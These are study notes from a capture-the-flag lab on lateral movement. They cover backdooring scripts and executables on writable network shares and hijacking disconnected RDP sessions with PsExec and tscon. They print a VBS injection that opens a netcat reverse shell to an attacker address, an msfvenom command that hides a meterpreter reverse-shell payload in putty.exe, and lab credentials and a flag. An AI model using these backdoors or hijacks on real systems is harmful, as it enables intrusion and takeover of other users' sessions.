# LAB — Lateral Movement: Abusing User Behavior

Miscellaneous techniques that don't rely on standard credential attacks but take advantage of misconfigurations and user behavior.

## Abusing Writable Shares

Corporate environments commonly have network shares that legitimate users rely on for day-to-day tasks. If such a share is **writable**, an attacker can plant or backdoor files to force users into executing an arbitrary payload and gain access to their machines.

A common scenario: a **shortcut to a script or executable** hosted on a network share. Administrators keep an executable on a share so users can run it without installing it locally.

![](attachments/Pasted%20image%2020261010174156.png)

Although the script/executable is hosted on the server, when a user opens the shortcut on their workstation the executable is copied to the user's `%temp%` folder and executed **on the workstation** — so any payload runs in the context of the final user's workstation and logged-in account.

In the real world this is relatively rare (write permissions on shared operational files are usually admin-only), but where writable access exists you can modify the file to run arbitrary code as whoever launches it.

Share permission levels:
- **Read** — open or download files.
- **Write** — create, modify, or replace files.
- **Full Control** — read, write, modify permissions, manage files.

### Backdooring `.vbs` scripts

If the shared resource is a VBS script, put a copy of `nc64.exe` on the same share and inject this into the script:

```vb
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This copies `nc64.exe` from the share to the user's `%tmp%` directory and sends a reverse shell back whenever a user opens the shared VBS script.

| Part | Meaning |
|---|---|
| `WScript.Shell` | Allows the script to launch Windows commands |
| `cmd.exe /c` | Runs a command and then exits |
| `copy /Y` | Copies a file, overwriting if necessary |
| `%tmp%` | Windows temp directory for the current user |
| `nc64.exe` | Netcat |
| `-e cmd.exe` | Attaches a command shell to the connection |
| Attacker IP and port | Destination for the reverse connection |
| `0, True` | Runs the launched command hidden and waits for it to finish |

### Backdooring `.exe` files

If the shared file is a Windows binary (e.g. `putty.exe`), download it and use `msfvenom` to inject a backdoor. The binary still works as usual but silently executes an additional payload:

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

| Option | Meaning |
|---|---|
| `-a x64` | Target 64-bit architecture |
| `--platform windows` | Target Windows |
| `-x putty.exe` | Use the specified executable as a template |
| `-k` | Keep the original executable running as a separate process |
| `-p windows/meterpreter/reverse_tcp` | Meterpreter reverse TCP payload |
| `lhost` | Address the payload connects back to |
| `lport` | Port it connects to |
| `-b "\x00"` | Null byte as a bad character to avoid |
| `-f exe` | Output Windows executable format |
| `-o puttyX.exe` | Output filename |

Replace the executable on the share and wait for connections using the `exploit/multi/handler` module in Metasploit. The payload typically runs with the executing user's permissions (not automatically Administrator/SYSTEM); impact is greater if that user is an admin.

### Prevention

- Remove write access from users who don't need to modify shared applications.
- Separate software distribution folders from user-writable folders.
- Use digital signatures and application control to restrict untrusted executables/scripts.
- Monitor unexpected changes to shared scripts and binaries.
- Avoid shortcuts that launch executables from writable network locations.
- Use EDR to identify suspicious script execution and unexpected outbound connections.

**Note:** A writable share becomes dangerous when users trust and execute files stored there; the attacker abuses that trust to get code executed on another computer, generally under the logged-in user's permissions. This is a form of **client-side execution through a trusted shared resource**, relevant to lateral movement when the target is another user's workstation.

## RDP Hijacking

When an administrator connects via Remote Desktop and closes the RDP client (clicking **X**) instead of logging off, their session remains open on the server **indefinitely** in a disconnected state. With **`SYSTEM` privileges** on **Windows Server 2016 and earlier**, you can take over any existing RDP session **without a password**.

If you have administrator-level access, get SYSTEM by any method — here we use PsExec. First run `cmd.exe` as administrator:

![](attachments/Pasted%20image%2020261010182511.png)

Then run `PsExec64.exe` (available at `C:\tools\`):

```
PsExec64.exe -s cmd.exe
```

List existing sessions:

```
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

If connected via RDP as administrator, our `SESSIONNAME` would be `rdp-tcp#6`. User `luke` left session id `3` open. A **Disc** (Disconnected) state means the user isn't actively using it. (You can take over active sessions too, but the legitimate user is forced out, which may be noticed.)

To take over a session, use `tscon.exe` with the source session ID and your current `SESSIONNAME` as destination. To take over luke's session while connected as administrator:

```
tscon 3 /dest:rdp-tcp#6
```

This connects luke's graphical session `3` to the administrator's RDP session `rdp-tcp#6`, immediately resuming luke's RDP session.

> **Note:** Windows Server **2019** won't allow connecting to another user's session without knowing its password. `tscon` across different user sessions strictly requires **`SYSTEM`** privileges — a normal admin prompt fails with an access/parameter error.

## Lab Walkthrough — Hijack an RDP Session

Obtain credentials from [http://distributor.za.tryhackme.com/creds_t2](http://distributor.za.tryhackme.com/creds_t2) (**different link from the other tasks**). These grant administrative access to THMJMP2.

Example credentials: `t2_eileen.hall` / `Higgins1980`. Connect via RDP:
```
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eileen.hall /p:Higgins1980 /cert:ignore /dynamic-resolution
```
(Display options like `/dynamic-resolution`, `/workarea`, `/smart-sizing` help the desktop render; accept the SSL certificate prompt.)

Open an **administrative** command prompt (right-click `cmd.exe` → Run as administrator) and list sessions:
```
C:\Windows\system32>query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 t1_toby.beck                              2  Disc            7  10/10/2026 10:18 AM
 t1_toby.beck1                             3  Disc            7  10/10/2026 10:18 AM
 t1_toby.beck2                             4  Disc            7  10/10/2026 10:18 AM
 t1_toby.beck3                             5  Disc            6  10/10/2026 10:19 AM
 t1_toby.beck4                             6  Disc            6  10/10/2026 10:19 AM
 t1_toby.beck5                             7  Disc            6  10/10/2026 10:19 AM
>t2_eileen.hall        rdp-tcp#89          8  Active          .  10/10/2026 12:34 PM
```
> The multiple `t1_toby.beck` entries are identical copies of the same user — hijack any one marked **disconnected (Disc.)** (don't interfere with active sessions).

Attempting `tscon` directly as admin fails — you need SYSTEM:
```
C:\Windows\system32>tscon 2 /dest:rdp-tcp#89
Could not connect sessionID 2 to sessionname rdp-tcp#89, Error code 1326
Error [1326]:The user name or password is incorrect.
```
```
C:\tools>whoami
za\t2_eileen.hall
```

Elevate to SYSTEM with PsExec (`C:\tools\PsExec64.exe`):
```
PsExec64.exe -s cmd.exe
```
(Click **Agree** on the EULA prompt. `-s` runs as `NT AUTHORITY\SYSTEM`; add `-i` to run interactively on the active desktop.)
```
C:\tools>PsExec64.exe -s cmd.exe
...
C:\Windows\system32>whoami
nt authority\system
```

Now re-run `tscon` as SYSTEM:
```
tscon 2 /dest:rdp-tcp#89
```
The disconnected session takes over your screen.

![](attachments/Pasted%20image%2020261010181159.png)

On the hijacked desktop, the flag is on the wallpaper, e.g.:
```
THM{nice_wallpaper}
```

**Key takeaway:** when you gain administrative RDP access during a CTF/pentest, always run `query user`. If higher-privileged users have disconnected sessions, elevate to `SYSTEM` and use `tscon` to hijack them — moving laterally without needing cleartext passwords.
